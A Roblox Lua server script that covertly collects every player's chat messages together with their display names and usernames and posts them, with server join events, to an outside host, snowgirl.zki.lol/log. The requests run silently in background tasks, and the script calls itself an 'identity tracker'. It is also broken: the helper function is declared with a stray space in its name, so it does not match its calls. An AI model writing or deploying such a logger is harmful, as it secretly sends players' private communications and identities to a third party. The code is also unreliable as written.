-- --- CONFIGURATION ---
local SERVER_URL = "http://snowgirl.zki.lol/log"

-- --- SERVICES ---
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")

local jobId = game.JobId ~= "" and game.JobId or "Studio-Testing-ID"

-- --- HELPERS ---
local function sendWebhookPayload(payloadType, extraData)
    local data = {
        type = payloadType,
        jobId = jobId
    }
    
    if extraData then
        for k, v in pairs(extraData) do
            data[k] = v
        end
    end

    local success, jsonPayload = pcall(function()
        return HttpService:JSONEncode(data)
    end)

    if not success then return end

    task.spawn(function()
        pcall(function()
            HttpService:PostAsync(SERVER_URL, jsonPayload, Enum.HttpContentType.ApplicationJson)
        end)
    end)
end

-- --- INITIALIZATION LOG ---
sendWebhookPayload("join")

-- --- CHAT PROCESSING CHANNELS ---

local function format AndSendChat(player, rawMessage)
    if not player then return end
    
    -- Format: [DisplayName] (@Username): Message
    local formattedMessage = string.format("[%s] (@%s): %s", 
        player.DisplayName, 
        player.Name, 
        rawMessage
    )
    
    sendWebhookPayload("chat", { message = formattedMessage })
end

-- 1. Modern Chat Engine (TextChatService)
if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
    TextChatService.MessageReceived:Connect(function(textChatMessage)
        local textSource = textChatMessage.TextSource
        if textSource then
            local player = Players:GetPlayerByUserId(textSource.UserId)
            formatAndSendChat(player, textChatMessage.Text)
        end
    end)
else
    -- 2. Legacy Chat Engine Fallback (LegacyChatService)
    local function hookPlayer(player)
        player.Chatted:Connect(function(message)
            formatAndSendChat(player, message)
        end)
    end

    Players.PlayerAdded:Connect(hookPlayer)
    for _, player in ipairs(Players:GetPlayers()) do
        hookPlayer(player)
    end
end

print("[LOGGER ACTIVE] Enhanced identity tracker running.")
